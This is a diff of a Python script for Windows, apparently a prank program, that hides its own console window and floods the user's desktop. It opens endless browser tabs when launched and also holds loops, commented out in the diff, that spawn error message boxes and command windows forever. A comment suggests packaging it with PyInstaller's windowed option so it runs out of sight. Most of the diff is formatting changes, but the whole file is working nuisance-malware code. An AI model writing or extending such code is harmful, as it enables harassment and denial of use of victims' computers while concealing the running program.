@@ -2,17 +2,17 @@
 import ctypes
 import win32gui
 import win32.lib.win32con as win32con
-from os import system, name
+from os import system
 import webbrowser
 import random
 from time import sleep
 
-#<---------->
+# <---------->
 
-#if name != "nt":
-#    exit()
+# if name != "nt":
+#     exit()
 
-#<---------->
+# <---------->
 
 LOGIN_MSG = r"""
  ______     ______     ______      ______   __  __     ______     __  __     ______     _____    
@@ -20,28 +20,36 @@ LOGIN_MSG = r"""
 \ \ \__ \  \ \  __\   \/_/\ \/    \ \  __\ \ \ \_\ \  \ \ \____  \ \  _"-.  \ \  __\   \ \ \/\ \ 
  \ \_____\  \ \_____\    \ \_\     \ \_\    \ \_____\  \ \_____\  \ \_\ \_\  \ \_____\  \ \____- 
   \/_____/   \/_____/     \/_/      \/_/     \/_____/   \/_____/   \/_/\/_/   \/_____/   \/____/ 
-                                                                                                 
-""" #http://patorjk.com/software/taag/#p=display&f=Sub-Zero&t=GET%20FUCKED
+
+"""  # http://patorjk.com/software/taag/#p=display&f=Sub-Zero&t=GET%20FUCKED
+
+
 def login():
     """Print login msg"""
     print(LOGIN_MSG)
 
 #<---------->
-def hide(): #USE PYINSTALLER "--window" OPTION (https://stackoverflow.com/questions/49648642/convert-pyw-to-exe-and-have-the-command-line-not-open)
+
+
+def hide(): # USE PYINSTALLER "--window" OPTION (https://stackoverflow.com/questions/49648642/convert-pyw-to-exe-and-have-the-command-line-not-open)
     """Hide cmd window"""
     thisprogramm = win32gui.GetForegroundWindow()
     win32gui.ShowWindow(thisprogramm, win32con.SW_HIDE)
 
 #<---------->
+
+
 def spam_msgbox():
     """Spam user with windows"""
     while True:
         ctypes.windll.user32.MessageBoxW(0, "GET FUCKED", "LMAO", 16)
 
+
 def spam_cmd():
     """Spam user with cmd"""
     while True:
         system("start")
+
 
 def spam_tabs():
     """Spam user with tabs"""
@@ -54,5 +62,5 @@ def spam_tabs():
 
 print(LOGIN_MSG)
 spam_tabs()
-#spam_msgbox()
-#spam_cmd()
+# spam_msgbox()
+# spam_cmd()
